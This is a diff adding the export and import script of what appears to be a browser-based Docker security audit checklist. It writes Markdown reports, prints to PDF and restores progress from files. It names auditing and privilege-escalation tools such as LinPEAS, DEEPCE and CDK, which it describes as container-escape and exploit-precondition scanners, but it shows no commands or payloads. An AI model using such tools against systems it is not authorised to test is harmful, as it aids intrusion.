+  md += `| LinPEAS | Automated sweep | https://github.com/peass-ng/PEASS-ng |\n`;
+  md += `| DEEPCE  | Container escape enumeration | https://github.com/stealthcopter/deepce |\n`;
+  md += `| CDK     | Auto-evaluate exploit preconditions | https://github.com/cdk-team/CDK |\n`;
+  md += `| pspy    | Unprivileged process monitor | https://github.com/DominicBreuker/pspy |\n`;
+  md += `| Lynis   | System security auditing | https://github.com/CISOfy/lynis |\n\n`;
+
+  TOOLS_DATA.forEach(t => {
+    if (!t.tid) return;
+    const checked = state[t.tid] ? '[x]' : '[ ]';
+    md += `### ${checked} Tool — ${t.title}\n\n`;
+    if (t.why) md += `**Why:** ${t.why}\n\n`;
+    const cmdsOnly = (t.cmds||[]).filter(i=>i.c);
+    if (cmdsOnly.length) {
+      md += `**Commands:**\n\n`;
+      cmdsOnly.forEach((item,idx) => {
+        const run = cmdState[t.tid+'_'+idx] ? '[x]' : '[ ]';
+        md += `- ${run} \`${item.c}\`\n`;
+      });
+      md += '\n';
+    }
+    const rootMode = t.root || 'low';
+    if (rootMode === 'both') {
+      const nL = exportNote(notes[t.tid+'_low']);
+      const nR = exportNote(notes[t.tid+'_root']);
+      md += `**Output (low-priv):**\n\n\`\`\`\n${nL}\n\`\`\`\n\n`;
+      md += `**Output (root):**\n\n\`\`\`\n${nR}\n\`\`\`\n\n`;
+    } else {
+      const nk = t.tid + (rootMode==='root'?'_root':'_low');
+      const label = rootMode === 'root' ? '(root)' : '(low-priv)';
+      md += `**Output ${label}:**\n\n\`\`\`\n${exportNote(notes[nk])}\n\`\`\`\n\n`;
+    }
+  });
+
+  // Check sections
+  let currentSection = '';
+  let stepNum = 0;
+  DATA.forEach(s => {
+    if (s.section) { currentSection = s.section; md += `## ${s.section}\n\n`; return; }
+    stepNum++;
+    const checked = state[s.id] ? '[x]' : '[ ]';
+    md += `### ${checked} Step ${String(stepNum).padStart(2,'0')} — ${s.title}\n\n`;
+    if (s.why) md += `**Why:** ${s.why}\n\n`;
+    if (s.look) md += `**Look for:** ${s.look}\n\n`;
+    const rootMode = s.root || 'low';
+    const rootLabel = rootMode==='root'?'Root required':rootMode==='both'?'Run as both':'Low-priv';
+    md += `**Access:** ${rootLabel}\n\n`;
+    const cmdsOnly = s.cmds.filter(i=>i.c);
+    if (cmdsOnly.length) {
+      md += `**Commands:**\n\n`;
+      cmdsOnly.forEach((item,idx) => {
+        const run = cmdState[s.id+'_'+idx] ? '[x]' : '[ ]';
+        md += `- ${run} \`${item.c}\`\n`;
+      });
+      md += '\n';
+    }
+    if (rootMode === 'both') {
+      const nL = exportNote(notes[s.id+'_low']);
+      const nR = exportNote(notes[s.id+'_root']);
+      md += `**Output (low-priv):**\n\n\`\`\`\n${nL}\n\`\`\`\n\n`;
+      md += `**Output (root):**\n\n\`\`\`\n${nR}\n\`\`\`\n\n`;
+    } else {
+      const nk = s.id + (rootMode==='root'?'_root':'_low');
+      const label = rootMode === 'root' ? '(root)' : '(low-priv)';
+      md += `**Output ${label}:**\n\n\`\`\`\n${exportNote(notes[nk])}\n\`\`\`\n\n`;
+    }
+  });
+
+  // Additional checks
+  if (customChecks.length > 0) {
+    md += `## Additional Checks\n\n`;
+    customChecks.forEach((cc, idx) => {
+      const checked = cc.done ? '[x]' : '[ ]';
+      md += `### ${checked} Custom ${String(idx+1).padStart(2,'0')} — ${cc.title || '(untitled)'}\n\n`;
+      const note = cc.note.trim() === '(no output recorded)' ? '' : cc.note.trim();
+      md += `**Notes / Output:**\n\n\`\`\`\n${exportNote(note)}\n\`\`\`\n\n`;
+    });
+  }
+
+  // References
+  md += `---\n\n## References\n\n`;
+  REFS.forEach(cat => {
+    md += `### ${cat.cat}\n\n`;
+    cat.items.forEach(ref => { md += `- **[${ref.title}](${ref.url})** — ${ref.desc}\n`; });
+    md += '\n';
+  });
+
+  const blob = new Blob([md], {type:'text/markdown'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  const dateSuffix = now.toISOString().substring(0,10);
+  const redactSuffix = redactEnabled ? '_redacted' : '_raw';
+  a.download = `docker_audit_${dateSuffix}${redactSuffix}.md`;
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+// ── PDF export ─────────────────────────────────────────
+function exportPdf() {
+  const date = new Date().toISOString().substring(0,10);
+  const suffix = redactEnabled ? '_redacted' : '_raw';
+  const prevTitle = document.title;
+  document.title = `docker_audit_${date}${suffix}`;
+
+  // Replace every textarea with a div so content fully expands in print.
+  // Textareas are fixed-height form controls in the print engine — divs are not.
+  const replacements = [];
+  document.querySelectorAll('textarea.output-field').forEach(ta => {
+    const raw = ta.value || '';
+    const content = redactEnabled ? (redactOutput(raw) || raw) : raw;
+    const div = document.createElement('div');
+    div.setAttribute('data-print-field', '1');
+    div.textContent = content || '(no output recorded)';
+    ta.parentNode.insertBefore(div, ta);
+    ta.style.display = 'none';
+    replacements.push({div, ta});
+  });
+
+  // Inject a scoped print stylesheet that makes the divs look right
+  const style = document.createElement('style');
+  style.id = 'print-inject';
+  style.textContent = `
+    @media print {
+      [data-print-field] {
+        display: block !important;
+        white-space: pre-wrap !important;
+        word-break: break-all !important;
+        font-family: 'Fira Mono', 'Consolas', monospace !important;
+        font-size: 10px !important;
+        line-height: 1.5 !important;
+        padding: 6px 8px !important;
+        border: 0.5px solid #ccc !important;
+        border-radius: 4px !important;
+        background: #f7f7f5 !important;
+        color: #1a1a18 !important;
+        height: auto !important;
+        min-height: 0 !important;
+        max-height: none !important;
+        overflow: visible !important;
+        page-break-inside: auto !important;
+      }
+    }
+  `;
+  document.head.appendChild(style);
+
+  // Defer print until browser has repainted the DOM changes
+  setTimeout(() => {
+    window.print();
+
+    // Restore everything after dialog
+    document.title = prevTitle;
+    replacements.forEach(({div, ta}) => {
+      ta.style.display = '';
+      div.remove();
+    });
+    const injected = document.getElementById('print-inject');
+    if (injected) injected.remove();
+  }, 120);
+}
+
+// ── Markdown import ────────────────────────────────────
+function importMd(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const text = e.target.result;
+    let imported = 0;
+
+    // Parse step checkboxes: ### [x] Step 01 — Title  or  ### [x] Tool — Title
+    const stepRe = /###\s+\[x\]\s+(?:Step\s+\d+\s+—\s+(.+)|Tool\s+—\s+(.+))/g;
+    let m;
+    while ((m = stepRe.exec(text)) !== null) {
+      const title = (m[1] || m[2]).trim();
+      // Find matching step/tool by title
+      const found = [...DATA, ...TOOLS_DATA].find(s => s.title && s.title.trim() === title);
+      if (found) { const k = found.id !== undefined ? found.id : found.tid; state[k] = true; imported++; }
+    }
+
+    // Parse command checkboxes: - [x] `command`
+    const cmdRe = /^-\s+\[x\]\s+`(.+)`$/gm;
+    while ((m = cmdRe.exec(text)) !== null) {
+      const cmd = m[1].trim();
+      // Find in CMD_STORE
+      for (const [ckey, val] of Object.entries(CMD_STORE)) {
+        if (val.trim() === cmd) { cmdState[ckey] = true; break; }
+      }
+    }
+
+    // Parse output blocks: **Output (low-priv):** or **Output (root):** or **Output (low-priv/root):**
+    // Pattern: **Output (xxx):**\n\n```\n...\n```
+    const outRe = /###\s+(?:\[.\])\s+(?:Step\s+\d+\s+—\s+(.+)|Tool\s+—\s+(.+))[\s\S]*?\*\*Output\s*\(?(low-priv|root)\)?[:\s]*\*\*\s*\n+```\n([\s\S]*?)```/g;
+    while ((m = outRe.exec(text)) !== null) {
+      const title = (m[1] || m[2]).trim();
+      const type = m[3]; // 'low-priv' or 'root'
+      const content = m[4].trim();
+      if (content === '(no output recorded)') continue;
+      const found = [...DATA, ...TOOLS_DATA].find(s => s.title && s.title.trim() === title);
+      if (found) {
+        const k = found.id !== undefined ? found.id : found.tid;
+        const suffix = type === 'root' ? '_root' : '_low';
+        notes[k + suffix] = content;
+      }
+    }
+
+    // Parse custom checks: ### [x] Custom 01 — Title
+    const customRe = /###\s+(\[.\])\s+Custom\s+\d+\s+—\s*(.*)\n[\s\S]*?\*\*Notes \/ Output:\*\*\s*\n+```\n([\s\S]*?)```/g;
+    customChecks = [];
+    while ((m = customRe.exec(text)) !== null) {
+      const done = m[1] === '[x]';
+      const title = m[2].trim();
+      const note = m[3].trim() === '(no output recorded)' ? '' : m[3].trim();
+      customChecks.push({title, note, done});
+    }
+
+    save();
+    render();
+    renderCustomChecks();
+    updateBar();
+    // Restore textarea values from notes
+    Object.entries(notes).forEach(([nk, val]) => {
+      const el = document.getElementById('note-' + nk);
+      if (el) el.value = val;
+    });
+    // Restore checkboxes
+    Object.entries(state).forEach(([k, v]) => {
+      if (!v) return;
+      const row = document.getElementById('row-' + k);
+      const cb = document.getElementById('scb-' + k);
+      if (row) row.classList.toggle('done', true);
+      if (cb) cb.classList.toggle('on', true);
+    });
+    Object.entries(cmdState).forEach(([ckey, v]) => {
+      if (!v) return;
+      const cb = document.getElementById('ccb-' + ckey);
+      const code = document.getElementById('ccode-' + ckey);
+      if (cb) cb.classList.toggle('on', true);
+      if (code) code.classList.toggle('cmd-done', true);
+    });
+    alert(`Import complete. Restored ${imported} step checkboxes, ${Object.keys(notes).length} output fields, and ${customChecks.length} additional checks.`);
+  };
+  reader.readAsText(file);
+  event.target.value = '';
+}
+
+load(); render(); renderRefs(); renderCustomChecks(); updateBar();
+</script>
+</body>
+</html>
